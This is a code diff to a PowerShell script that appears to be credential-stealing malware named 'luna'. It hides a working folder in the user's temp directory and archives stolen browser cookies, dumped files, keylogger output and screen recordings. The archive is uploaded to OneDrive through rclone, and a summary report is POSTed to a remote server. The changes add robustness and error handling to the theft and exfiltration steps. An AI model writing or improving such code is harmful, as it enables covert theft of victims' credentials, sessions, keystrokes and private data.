@@ -2,6 +2,11 @@
 
 $serverUrl = "https://onclick-back.onrender.com"
 $tempDir = "$env:TEMP\luna"
+    if (!(Test-Path $tempDir)) {
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+        (Get-Item $tempDir).Attributes = 'Hidden'
+    }
+    New-Item -ItemType Directory -Path $cookieDir, $fileDumpDir -Force | Out-Null
 $cookieDir = "$tempDir\cookies"
 $fileDumpDir = "$tempDir\files"
 $logPath = "$tempDir\log.json"
@@ -147,13 +152,30 @@ function Archive-And-Report {
         $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
         "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta
 
+        $pathsToArchive = @($logPath, $meta, $keylogPath)
+
+        if (Test-Path $cookieDir) {
+            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+
+        if (Test-Path $fileDumpDir) {
+            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
+        }
+
         if (Test-Path $videoDir) {
             Get-ChildItem $videoDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
-                Copy-Item $_.FullName "$videoSubDir\$($_.Name)" -Force -ErrorAction SilentlyContinue
+                $targetPath = "$videoSubDir\$($_.Name)"
+                Copy-Item $_.FullName $targetPath -Force -ErrorAction SilentlyContinue
+                $pathsToArchive += $targetPath
             }
         }
 
-        Compress-Archive -Path @($logPath, $meta, $keylogPath, $cookieDir, $fileDumpDir, $videoSubDir) -DestinationPath $zipPath -Force
+        if ($pathsToArchive.Count -eq 0) {
+            Write-Warning "Nothing to archive — skipping archive/report"
+            return
+        }
+
+        Compress-Archive -Path $pathsToArchive -DestinationPath $zipPath -Force
 
         & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
@@ -164,8 +186,8 @@ function Archive-And-Report {
             Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
         }
 
-        $filesCount = (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count
-        $cookiesCount = (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count
+        $filesCount = (Test-Path $fileDumpDir) ? (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count : 0
+        $cookiesCount = (Test-Path $cookieDir) ? (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count : 0
 
         $summary = @"
 PowerShell Identity Report
@@ -176,7 +198,11 @@ Files: $filesCount
 Cookies: $cookiesCount
 "@
 
-        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
+        try {
+            Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
+        } catch {
+            Write-Warning "Failed to send report: $_"
+        }
     } catch {
         Write-Warning "Archive or report failed: $_"
     }
